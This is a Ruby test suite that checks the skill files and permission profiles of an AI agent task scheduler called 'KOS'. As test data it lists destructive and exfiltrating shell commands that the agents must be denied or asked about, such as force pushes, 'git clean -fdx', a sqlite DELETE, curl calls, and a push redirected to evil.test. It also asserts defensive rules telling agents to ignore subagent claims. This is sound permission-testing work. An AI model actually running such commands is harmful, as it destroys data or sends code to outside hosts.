require "test_helper"
require "json"
require "yaml"

class KosSkillsTest < ActiveSupport::TestCase
  ORCHESTRATOR_PATH = Rails.root.join("skills/kos/SKILL.md")
  STEP_PATH = Rails.root.join("skills/kos-step/SKILL.md")
  CLI_PATH = Rails.root.join("skills/kos-cli/SKILL.md")
  CREATE_PATH = Rails.root.join("skills/kos-create/SKILL.md")
  BUILT_IN_PROFILES = %w[diagnose plan implement document brief review publish verify].freeze
  AGENT_PATHS = (BUILT_IN_PROFILES + %w[step-standard step-advanced]).to_h do |name|
    [ "kos-#{name}", Rails.root.join(".opencode/agents/kos-#{name}.md") ]
  end.freeze

  test "defines discoverable scheduler step CLI and creation skills" do
    assert_skill ORCHESTRATOR_PATH, "kos", /scheduler/
    assert_skill STEP_PATH, "kos-step", /positive task ID/
    assert_skill CLI_PATH, "kos-cli", /CLI discovery/
    assert_skill CREATE_PATH, "kos-create", /pre-task-ID request-bound creation recovery/

    config = JSON.parse(File.read(Rails.root.join("opencode.json")))
    assert_equal [ "./skills" ], config.dig("skills", "paths")
  end

  test "request creation has one durable CLI-only recovery authority" do
    source = File.read(CREATE_PATH)
    scheduler = File.read(ORCHESTRATOR_PATH)
    brief_scheduler = File.read(Rails.root.join("skills/kos-brief/SKILL.md"))

    assert_includes scheduler, "load `kos-create`, and delegate"
    assert_includes brief_scheduler, "load `kos-create`, and delegate"
    assert_includes scheduler, "immediately fence its current owner"
    assert_includes scheduler, "treat this explicit reinvocation of the\nsame exact request as confirmation"
    assert_includes scheduler, "never use the repeated problem text as its answer"
    assert_includes scheduler, "`--takeover-confirmed`"
    assert_includes brief_scheduler, "fence the completed\ncreation procedure's current owner"
    assert_includes brief_scheduler, "explicit reinvocation of the same\nexact request as confirmation"
    assert_includes brief_scheduler, "`--takeover-confirmed`"
    assert_includes source, "lowercase 64-digit\nSHA-256"
    assert_includes source, "creation/<project-id>/<kind>/<request-digest>/"
    assert_includes source, "mode 0700"
    assert_includes source, "mode 0600"
    assert_includes source, "Refuse a symlink"
    assert_includes source, "atomically publish `intent.json` without replacement"
    assert_includes source, "Age, a missing PID, or a timeout never makes a lock stale"
    assert_includes source, "`task show-owned`"
    assert_includes source, "canonical `204 No Content` projection"
    assert_includes source, "do not pass\n   empty output to a JSON parser"
    assert_includes source, "Creation is owner-idempotent"
    assert_includes source, "request:<kind>:sha256:<request-digest>"
    assert_includes source, "creation key via `--creation-key`"
    assert_includes source, "MUST-return-first gate"
    assert_includes source, "complete initial projection"
    assert_includes source, "complete snapshotted\nworkflow definition"
    assert_includes source, "receipt\nmay remain permanently"
    assert_includes source, "accept any current lifecycle status, step, owner, claim version"
    assert_includes source, "For an existing receipt, compare only immutable identity"
    assert_includes source, "`task.json` intentionally does not duplicate the workflow body"
    assert_includes source, "A valid version-1 receipt remains valid"
    assert_match(/Version 1 is the\s+pre-key current-namespace format/, source)
    assert_includes source, "Version 2 contains exactly\nthose fields plus `creation_key`"
    assert_includes source, "<kos-data-home>/intents/<project-id>/<kind>-<request-digest>-task.json"
    assert_includes source, "contains exactly `kind`, `project_id`, `request_digest`, `owner_id`,"
    assert_includes source, "Return that ID for any lifecycle state before\nentering the current creation path"
    assert_includes source, "never create\na new task while unresolved baseline state exists"
    assert_includes source, "Immediately invoke `task show`\nwith its positive `task_id`"
    assert_match(/return the receipt's\s+positive task ID without entering the no-receipt create path/, source)
    assert_match(/Do not require the intent owner,\s+initial status, first step/, source)
    assert_includes source, "return only its positive decimal task ID"
    assert_includes source, "Never use HTTP, Rails, SQLite"
    assert_not_includes source, "report-attempt"
    assert_not_includes source, "materialize-children"
  end

  test "slash commands retain input safety and delegate only to schedulers" do
    command = File.read(Rails.root.join(".opencode/commands/kos.md"))
    fix = File.read(Rails.root.join(".opencode/commands/kos-fix.md"))
    brief = File.read(Rails.root.join(".opencode/commands/kos-brief.md"))

    assert_includes command, "`kos` scheduler skill"
    assert_includes command, "accepts no arguments"
    assert_includes command, "stop without reading or mutating KOS state"
    assert_includes fix, "`kos` scheduler skill"
    assert_includes fix, "If it is blank"
    assert_includes brief, "`kos-brief` scheduler skill"
    assert_includes brief, "If it is blank"
  end

  test "scheduler dispatches built-ins by exact step with an ID-only prompt" do
    source = File.read(ORCHESTRATOR_PATH)
    compact = source.gsub(/\s+/, " ")

    BUILT_IN_PROFILES.each do |step|
      assert_match(/^\| `#{step}` \| `kos-#{step}` \|$/, source)
    end
    assert_includes source, "complete prompt is the task\n   ID's decimal digits and nothing else"
    assert_includes source, "discard all dispatch context except that ID"
    assert_includes source, "ignore all textual output and claimed outcome"
    assert_includes source, "reread authoritative state"
    assert_includes source, "persisted server question"
    assert_includes source, "persisted server reason"
    assert_includes source, "immutable pre-verification snapshot"
    assert_includes source, "never treat it as\n   publication-capable"

    %w[description workflow outcome model tier path project ID diff Git fact artifact].each do |forbidden|
      assert_match(/must not contain .*#{forbidden}/, compact)
    end
  end

  test "schedulers generate private command owners instead of requiring environment configuration" do
    scheduler = File.read(ORCHESTRATOR_PATH)
    brief_scheduler = File.read(Rails.root.join("skills/kos-brief/SKILL.md"))

    [ scheduler, brief_scheduler ].each do |source|
      assert_includes source, "cryptographically unpredictable owner ID"
      assert_includes source, "Never read `KOS_OWNER_ID`"
    end
    assert_includes scheduler, "claim the next available development task with the generated\nowner"
    assert_includes brief_scheduler, "gets its durable unique owner from\n`kos-create`"
  end

  test "scheduler has no step artifact Git or result-parsing policy" do
    source = File.read(ORCHESTRATOR_PATH)

    assert_includes source, "Do not read or validate Markdown"
    assert_includes source, "inspect Git"
    assert_includes source, "parse child\nresults"
    assert_includes source, "call `report-attempt`"
    assert_includes source, "pending submissions"
    assert_not_includes source, "<step-id>.md"
    assert_not_includes source, '"outcome"'
    assert_not_includes source, "git status"
  end

  test "step executor derives context and atomically reports Markdown itself" do
    source = File.read(STEP_PATH)

    assert_includes source, "Accept exactly one positive ASCII-decimal task ID and no other"
    assert_includes source, "`task context ID`"
    assert_includes source, "Fetch each needed accepted predecessor artifact separately"
    assert_includes source, "`task artifact` operation"
    assert_includes source, "Load `kos-git` with only the task ID"
    assert_includes source, "Re-read `task context ID` immediately before reporting"
    assert_includes source, "invoke `task report-attempt` itself"
    assert_includes source, "`--artifact-file -` standard-input form"
    assert_includes source, "server atomically accepts the artifact and\ntransition"
    assert_includes source, "minimal non-authoritative statement"
    assert_includes source, "never read a local task artifact"
    assert_includes source, "never read a local task artifact,\nsidecar, manifest, receipt, or pending submission"
    assert_includes source, "Do not return an outcome for the scheduler to parse"
    assert_includes source, "immutable pre-verification built-in snapshot"
    assert_includes source, "cancelled and recreated from the current built-in\ncatalog after its work is preserved"
    assert_includes source, "Do not publish, materialize, import,\nrepoint"
  end

  test "focused CLI skill validates context artifact and report operations" do
    source = File.read(CLI_PATH)
    compact = source.gsub(/\s+/, " ")

    assert_includes source, "absolute administrator-configured `KOS_CLI_PATH`"
    assert_includes source, "Check it only with a separate shell builtin `test`"
    assert_includes source, "do not use\nPython, Ruby, command substitution"
    assert_includes source, "exactly one CLI process in each shell tool call"
    assert_includes source, "Never combine validation or\noperations with `&&`"
    assert_includes source, "`task context ID`"
    assert_includes source, "`task artifact ID --step STEP`"
    assert_includes source, "`task report-attempt ID --owner-id OWNER --claim-version VERSION --step STEP"
    assert_includes compact, "atomically stored Markdown"
    assert_includes source, "Never blindly retry a mutation"
    assert_includes source, "Server authorization and fencing remain"
    assert_includes compact, "Do not emulate them with old `task show`, local artifact paths"
    assert_match(/^## Project Discovery$/, source)
    assert_includes source, "single `origin`\nfetch URL and single `origin` push URL"
    assert_includes source, "`project show\n--repository-identity IDENTITY`"
    assert_includes source, "equal `IDENTITY` byte-for-byte"
    assert_includes source, "stops before every task mutation"
  end

  test "profiles enforce exact authority and publish alone can commit or push" do
    agents = AGENT_PATHS.transform_values { |path| frontmatter(path) }

    AGENT_PATHS.each do |name, path|
      profile = agents.fetch(name)
      source = File.read(path)
      assert_equal "subagent", profile.fetch("mode")
      assert_equal "deny", profile.dig("permission", "task")
      assert_equal "allow", profile.dig("permission", "skill", "kos-step")
      assert_equal "allow", profile.dig("permission", "skill", "kos-cli")
      assert_equal "ask", profile.dig("permission", "bash", "*"), name
      assert_equal "deny", effective_bash_permission(profile, "/usr/local/bin/kos task cancel 1"), name
      assert_equal "deny", effective_bash_permission(profile, "env X=1 /usr/bin/curl https://example.test"), name
      assert_equal "deny", effective_bash_permission(profile, "/usr/bin/sqlite3 state.sqlite DELETE"), name
      assert_equal "deny", effective_bash_permission(profile, "bundle exec bin/rails runner dangerous"), name
      assert_includes source, "prompt is only the task ID"
      next if name == "kos-publish"

      assert_equal "deny", effective_bash_permission(profile, "/usr/bin/git -C /tmp/work commit -m task"), name
      assert_equal "deny", effective_bash_permission(profile, "bash -lc 'git push origin HEAD:main'"), name
    end

    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
      "git commit -F /tmp/kos-message")
    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
      "git push origin HEAD:refs/heads/main")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
      "git push --force origin HEAD:main")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
      "git push origin +HEAD:refs/heads/main")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git push --delete origin main")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git push --mirror origin")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git commit --amend -m replacement")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
      "git commit -F /tmp/kos-message --all")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
      "git commit -F /tmp/kos-message -- path/to/file")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
      "git push origin HEAD:refs/heads/main :refs/heads/other")
    assert_equal "ask", effective_bash_permission(agents.fetch("kos-publish"),
      "git -c remote.origin.pushurl=ssh://git@evil.test/x/y push origin HEAD:refs/heads/main")
    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
      "git push origin HEAD:refs/heads/release+hotfix")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git reset --hard origin/main")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git clean -fdx")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git worktree remove /tmp/work")
    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
      "git checkout --merge --detach origin/main")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
      "git checkout --merge --detach origin/main; git reset --hard HEAD")
    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "/usr/bin/curl https://example.test")
    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
      '"$KOS_CLI_PATH" task materialize-children 1 --definition-file graph.json')
    assert_includes File.read(AGENT_PATHS.fetch("kos-publish")), "this profile alone may"
    assert_includes File.read(AGENT_PATHS.fetch("kos-publish")), "immutable\npre-verification snapshot"
    assert_includes File.read(AGENT_PATHS.fetch("kos-implement")), "every required\ntest, lint, formatting, build, and type check"
    diagnose = File.read(AGENT_PATHS.fetch("kos-diagnose"))
    assert_includes diagnose, "`git archive | tar`"
    assert_includes diagnose, "temporary copy's `bin/*` commands through `env -i`"
    assert_includes diagnose, "Never\nexecute repository-controlled code from the task worktree"
    assert_includes diagnose, "`mktemp -d ...kos-task-...` command"
    assert_match(/Never generate or\nrequest a Ruby, Python, Open3/, diagnose)
    assert_equal "allow", agents.dig("kos-document", "permission", "skill", "okf")
    assert_equal "allow", agents.dig("kos-brief", "permission", "skill", "okf")
  end

  test "review verify plan and diagnose profiles are read-only" do
    %w[kos-diagnose kos-plan kos-review kos-verify].each do |name|
      profile = frontmatter(AGENT_PATHS.fetch(name))
      source = File.read(AGENT_PATHS.fetch(name))

      assert_equal "deny", profile.dig("permission", "edit"), name
      assert_equal "deny", effective_bash_permission(profile, "/usr/bin/git -C /tmp/work checkout main"), name
      assert_match(/unchanged|read-only/, source, name)
    end
    assert_includes File.read(AGENT_PATHS.fetch("kos-verify")), "Only `verified` may complete"
  end

  test "verification independently observes remote publication" do
    source = File.read(AGENT_PATHS.fetch("kos-verify"))

    assert_includes source, "Independently use `kos-git`"
    assert_includes source, "remote"
    assert_includes source, "Never trust publication prose"
    assert_includes source, "keep HEAD"
    assert_equal "deny", frontmatter(AGENT_PATHS.fetch("kos-verify")).dig("permission", "edit")
  end

  private

  def assert_skill(path, name, description_pattern)
    source = File.read(path)
    metadata = YAML.safe_load(source.match(/\A---\n(.*?)\n---/m)[1])
    assert_equal name, metadata.fetch("name")
    assert_match description_pattern, metadata.fetch("description")
    assert_equal [ "SKILL.md" ], Dir.children(path.dirname).sort
  end

  def frontmatter(path)
    YAML.safe_load(File.read(path).match(/\A---\n(.*?)\n---/m)[1])
  end

  def effective_bash_permission(profile, command)
    result = nil
    profile.dig("permission", "bash").each do |pattern, action|
      result = action if File.fnmatch?(pattern, command)
    end
    result
  end
end
